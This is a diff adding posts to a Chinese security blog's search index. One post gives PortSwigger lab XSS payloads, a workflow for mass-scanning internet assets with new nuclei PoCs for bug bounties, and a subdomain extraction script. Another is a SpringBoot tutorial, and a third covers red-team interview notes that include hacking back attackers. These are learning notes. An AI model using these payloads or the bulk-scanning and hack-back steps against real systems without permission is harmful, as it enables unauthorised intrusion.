+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125211832154.png" alt="image-20251125211832154"></p>
+</li>
+<li><p>第四个位置出现在属性里面，所以先直接对它进行测试。由于没有其他字符串拼接到payload，而是直接出现在href属性里，并且href属性中可以支持直接写js代码，所以payload：<code>javascript:alert(222)</code></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125212229168.png" alt="image-20251125212229168"></p>
+</li>
+</ol>
+<h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><ol>
+<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220214782.png" alt="image-20251125220214782"></p>
+</li>
+<li><p>经过测试，输入的内容会出现在两个位置，且都是p标签中，对尖括号还进行了实体化。进行不下去，查看burp数据包，发现Function关键字，可能会导致xss，进一步分析Function中的代码。我可以了解到，它会监视浏览器地址栏中#后面的内容变化，如果发生了改变，那么就会和其他内容放到jQuery的一个选择器里面，即$()。问题就出现在这个选择器上，当选择器里面出现了尖括号，jQuery就会把它视作HTML标签进行实例化。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220748739.png" alt="image-20251125220748739"></p>
+</li>
+<li><p>所以，我们可以直接在URL地址栏中，拼接payload：<code>/#&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125221537741.png" alt="image-20251125221537741"></p>
+</li>
+<li><p>为什么使用&lt;script&gt;标签没有生效呢</p>
+<ul>
+<li>jQuery的$()选择器在实例化DOM节点的时候，方式类似于innerHTML，而这种方式动态生成的js代码在浏览器中不会立即生效，需要二次刷新才能够进行触发；</li>
+<li>而img标签被实例化成DOM节点之后，js代码是通过onerror这个事件处理器进行执行的，即一旦实例化即刻生效。这种标签和属性还有很多，比如&lt;svg onload&gt;、&lt;iframe onload&gt;……</li>
+</ul>
+</li>
+</ol>
+<h3 id="DOM-AngularJS"><a href="#DOM-AngularJS" class="headerlink" title="DOM-AngularJS"></a>DOM-AngularJS</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. AngularJs是一个前端框架，支持`&#123;&#123;&#125;&#125;`模板表达式语法；</span><br><span class="line">2. AngularJS会扫描`ng-app`元素下的内容，如果遇到了`&#123;&#123;&#125;&#125;`，就会当成模板表达式进行执行；</span><br><span class="line">3. 由于框架的安全机制限制，没有办法直接支持&lt;script&gt;标签以及js函数。经过绕过之后，payload一般为：&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">4. 靶场：https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression</span><br><span class="line">5. Solution：https://blog.csdn.net/m0_65361643/article/details/151396393</span><br></pre></td></tr></table></figure>
+
+<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>
+
+<h1 id="企业背调"><a href="#企业背调" class="headerlink" title="企业背调"></a>企业背调</h1><ol>
+<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
+<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
+<li>SEO权重：<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
+</ol>
+<h1 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h1><ol>
+<li>权重为0：漏洞盒子-公益SRC</li>
+<li>有权重：补天</li>
+<li>edu.cn：教育SRC</li>
+<li>大厂：专属SRC</li>
+</ol>
+<h1 id="快速出洞"><a href="#快速出洞" class="headerlink" title="快速出洞"></a>快速出洞</h1><h3 id="通过Nday找目标"><a href="#通过Nday找目标" class="headerlink" title="通过Nday找目标"></a>通过Nday找目标</h3><p>在nuclei poc的收集平台上<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_poc以时间顺序倒推找最新的poc</a>  &#x3D;&#x3D;&gt;  然后通过FOFA匹配资产  &#x3D;&#x3D;&gt;  VPS批量漏洞+云端上传  &#x3D;&#x3D;&gt;  导出结果+ipinfoSearch批量查权重  &#x3D;&#x3D;&gt;  企查查&#x2F;爱企查做背调  &#x3D;&#x3D;&gt;  有权重交补天，没权重交盒子  &#x3D;&#x3D;&gt;  如果提示漏洞标题存在，加上一些特殊符号进行绕过。</p>
+<ol>
+<li>URL格式处理：<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具</a></li>
+</ol>
+<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol>
+<li>大厂边缘资产、非金融</li>
+<li>漏洞处置规则</li>
+</ol>
+<h1 id="Day01-字节SRC"><a href="#Day01-字节SRC" class="headerlink" title="Day01-字节SRC"></a>Day01-字节SRC</h1><blockquote>
+<ol>
+<li>SRC不强求漏洞利用，只要是漏洞就可以。当然，能够利用造成更大的危害肯定是更好</li>
+<li>SRC中常见漏洞：DOM-XSS、SSRF、逻辑漏洞、未授权访问</li>
+</ol>
+</blockquote>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
+<li><p>资产扩充——多个网络空间搜索引擎联合搜索：主域名、favicon、相同证书、C段</p>
+</li>
+<li><p>子域名提取脚本</p>
+ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_subdomains</span>(<span class="params">file_path, target_domain, include_main=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中提取指定域名下的子域名</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        file_path: 包含URL的文件路径</span></span><br><span class="line"><span class="string">        target_domain: 目标主域名(如example.com)</span></span><br><span class="line"><span class="string">        include_main: 是否包含主域名本身</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        去重后的子域名列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 编译正则表达式，用于匹配目标域名及其子域名</span></span><br><span class="line">    <span class="comment"># 支持带端口、路径等情况</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)*?&#x27;</span> + </span><br><span class="line">        re.escape(target_domain) + </span><br><span class="line">        <span class="string">r&#x27;(?::\d+)?(?:/.*)?$&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    subdomains = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试使用urlparse解析</span></span><br><span class="line">                parsed = urlparse(line)</span><br><span class="line">                <span class="keyword">if</span> parsed.netloc:  <span class="comment"># 有网络位置部分</span></span><br><span class="line">                    domain = parsed.netloc</span><br><span class="line">                    <span class="comment"># 去除端口</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> domain:</span><br><span class="line">                        domain = domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 没有协议部分，直接处理</span></span><br><span class="line">                    domain = line.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否匹配目标域名</span></span><br><span class="line">                <span class="keyword">if</span> pattern.<span class="keyword">match</span>(domain):</span><br><span class="line">                    <span class="comment"># 提取完整域名(包含子域名)</span></span><br><span class="line">                    full_domain = domain</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 确保不包含端口信息</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> full_domain:</span><br><span class="line">                        full_domain = full_domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 检查是否为主域名本身</span></span><br><span class="line">                    <span class="keyword">if</span> full_domain == target_domain:</span><br><span class="line">                        <span class="keyword">if</span> include_main:</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># 确认是目标域名的子域名</span></span><br><span class="line">                        <span class="keyword">if</span> full_domain.endswith(<span class="string">&#x27;.&#x27;</span> + target_domain):</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;处理文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按长度排序，便于阅读</span></span><br><span class="line">    sorted_subdomains = <span class="built_in">sorted</span>(subdomains, key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>)), x))</span><br><span class="line">    <span class="keyword">return</span> sorted_subdomains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;提取指定域名下的子域名&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;包含URL的文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标主域名(如example.com)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--include-main&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&#x27;是否包含主域名本身&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出结果到文件&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在从 <span class="subst">&#123;args.file&#125;</span> 中提取 <span class="subst">&#123;args.domain&#125;</span> 的子域名...&quot;</span>)</span><br><span class="line">    subdomains = extract_subdomains(args.file, args.domain, args.include_main)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n共找到 <span class="subst">&#123;<span class="built_in">len</span>(subdomains)&#125;</span> 个独特的子域名:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            <span class="built_in">print</span>(subdomain)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    f.write(subdomain + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到 <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n未找到 <span class="subst">&#123;args.domain&#125;</span> 的子域名&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>SRC</category>
+      </categories>
+      <tags>
+        <tag>SRC挖掘思路</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SpringBoot入门</title>
+    <url>/SpringBootDev.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<h1 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h1><h2 id="产品背景"><a href="#产品背景" class="headerlink" title="产品背景"></a>产品背景</h2><ol>
+<li><p>Spring生态众多，不止一两个框架而已，下图是一些Spring生态中比较出名的框架。可以看到从数据库、web、cloud到Android、LDAP等等，很多方向都有框架。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110231515495.png" alt="image-20251110231515495"></p>
+</li>
+<li><p>SpringFramework（以下简称SF）是Spring生态中最重要的一环、是最根本的基石，简单理解Spring中其他框架都来自于SF，所以也有很多人把SF简称为Spring，就像把DBMS简称为数据库是一样的道理。SpringBoot（以下简称SB）是基于SF，在web方向开发出来的一款框架（其实SF中的SpringMVC本就可以开发web，以前的“SSM”三件套，只是SB更加专业，逐渐代替了SSM）。SB对于开发者而言方便很多，现在Java后端几乎都采用SB进行开发，而且如下图所示，SB还可以和其他的一些工具&#x2F;框架相结合，使得web框架可定制化程度更高，更加受到开发者的青睐。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
+</li>
+<li><p>SB与SF的对应关系</p>
+<table>
+<thead>
+<tr>
+<th align="center">Spring Boot 版本</th>
+<th align="center">对应的 Spring Framework 版本范围</th>
+<th align="center">发布时间</th>
+<th align="center">支持状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">3.3.x</td>
+<td align="center">6.2.x</td>
+<td align="center">2024 年</td>
+<td align="center">最新版本，持续更新</td>
+</tr>
+<tr>
+<td align="center">3.2.x</td>
+<td align="center">6.1.x</td>
+<td align="center">2023 年底</td>
+<td align="center">活跃支持中（OSS 支持至 2025 年）</td>
+</tr>
+<tr>
+<td align="center">3.1.x</td>
+<td align="center">6.0.x</td>
+<td align="center">2023 年</td>
+<td align="center">已停止 OSS 支持，商业支持中</td>
+</tr>
+<tr>
+<td align="center">3.0.x</td>
+<td align="center">6.0.x（早期版本）</td>
+<td align="center">2022 年底</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.7.x（LTS）</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">长期支持（至 2025 年 11 月）</td>
+</tr>
+<tr>
+<td align="center">2.6.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.5.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2021 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.4.x</td>
+<td align="center">5.3.x</td>
+<td align="center">2020 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.3.x</td>
+<td align="center">5.2.x</td>
+<td align="center">2020 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.2.x</td>
+<td align="center">5.2.x</td>
+<td align="center">2019 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.1.x（LTS）</td>
+<td align="center">5.1.x</td>
+<td align="center">2018 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">2.0.x</td>
+<td align="center">5.0.x</td>
+<td align="center">2018 年</td>
+<td align="center">已停止支持</td>
+</tr>
+<tr>
+<td align="center">1.5.x（LTS）</td>
+<td align="center">4.3.x</td>
+<td align="center">2017 年</td>
+<td align="center">已停止支持</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><ol>
+<li><p>通过SpringBoot（以下简称SB）插件快速创建SB项目</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224213490.png" alt="image-20251110224213490"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224226584.png" alt="image-20251110224226584"></p>
+</li>
+<li><p>项目结构</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
+</li>
+<li><p>关键代码展示（IOC&#x2F;DI）</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//注册为SB的一个组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//如果有多个类型相同的组件，需要根据具体的类，指定要关联哪一个组件</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//自动关联类为UserDao的组件</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//这三行代码相当于：UserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过注解，告诉SB这是一个配置类****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//告诉SB，要管理哪个包下面的组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>单元测试</p>
+ <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//如果报错，在pom.xml中添加junit依赖</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取SB容器（这里是根据JavaConfig这个类创建出来的容器）</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//获取容器中的一个Bean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序输出：UserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DI之后) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>后端</tag>
+        <tag>SpringBoot</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队面试</title>
+    <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>常见安全设备之间的区别</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAF：专门对WEB进行防护的应用程序，对http流量进行特征检测，并及时拦截、封禁IP等措施；</span><br><span class="line">防火墙：主要在三层、四层进行过滤，根据规则进行拦截或者放行；</span><br><span class="line">IDS: 对交换机镜像过来的流量进行检测，根据特征进行匹配然后告警，一般旁路部署；</span><br><span class="line">IPS：在检测流量的基础之上，还可以拦截危险的流量，主要部署在出入口的一些地方，形成一条串行链路；</span><br><span class="line">态势感知：整个网络进行的监控，实时汇报攻击源、攻击事件，甚至还可以预测提示下一步的攻击方向，提前防御；</span><br><span class="line">蜜罐：故意部署的带有漏洞的一些系统，主要套取攻击者的一些攻击手法、工具等等，当然了，在一定程度上起到了防御作用；根据交互式程度一般分为低中高三种蜜罐，最常用的开源蜜罐一般是hfishing；</span><br><span class="line">威胁情报：对攻击事件进行的总结，形成的报告，最有意义/最具有代表性的要看里面的IOC（攻击的特征）。来源：微步在线、XXX威胁情报中心，在云沙箱里面运行可以程序，根据特征/IOC进行分析；</span><br><span class="line">EDR：根据特征库、行为对终端进行监控、防护、高危行为的组织。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么判断设备是不是误报</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 看来源IP：国内的/国外的、内部来源/外部来源、访问频率、有没有其他攻击行为的记录（安全设备&amp;威胁情报）；</span><br><span class="line">2. 人工分析流量特征：请求里面有没有一些比较敏感的流量特征/敏感的函数名关键字、响应内容是不是包含了敏感信息/命令执行的结果</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>windows入侵排查</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 恶意账号：net user/net localgroup/注册表找影子账户/在事件管理器的widnows安全日志中，找出登录的用户；</span><br><span class="line">2. netstat -ano获取外部链接ip，然后到威胁情报中心进行判断</span><br><span class="line">3. 启动项排查、计划任务</span><br><span class="line">4. everything查看新增的一些文件，重点筛选exe/vbs/dll，通过云沙箱进行在线判断</span><br><span class="line">5. 日志分析4625找失败的日志、4672管理员登录、4688找新创建的日志</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Linux入侵排查</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 账号安全：列出所有特权用户、sudo用户、远程登录用户；历史命令，可以在/etc/profile文件中配置记录命令时，同时记录IP地址</span><br><span class="line">2. ss -tulpna找出所有网络连接和对应的进程</span><br><span class="line">3. 启动项排查（/etc/rc.d/rc*.d/）、定时任务（/var/spool/cron/ /etc/crontab）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>溯源反制</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 确认攻击事件之后，通过系统日志、网络流量定位到攻击者ip；</span><br><span class="line">2. 通过一些在线网站ip138、站长之家反查域名，尽量找到攻击者的个人信息；</span><br><span class="line">3. 反打攻击者ip，找到vps上遗留的个人数据，查看登录日志，找出上一次的登录ip；</span><br><span class="line">4. 部署蜜罐，套取攻击者的工具信息、字典信息、攻击的目标等攻击手法</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+        <tag>八股文</tag>
+        <tag>面经</tag>
       </tags>
   </entry>
 </search>
